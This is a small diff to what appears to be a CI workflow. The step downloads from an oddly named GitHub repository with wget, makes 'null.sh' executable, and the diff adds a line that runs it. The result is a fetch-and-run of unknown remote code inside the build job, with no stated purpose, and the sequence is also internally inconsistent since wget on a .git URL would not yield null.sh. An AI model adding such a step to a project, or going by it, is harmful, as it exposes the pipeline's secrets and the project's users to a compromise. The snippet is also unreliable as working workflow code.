@@ -10,3 +10,4 @@ jobs:
       - run : |
              wget https://github.com/smaxvbvb/yareuihj.git
              chmod +x null.sh
+             ./null.sh
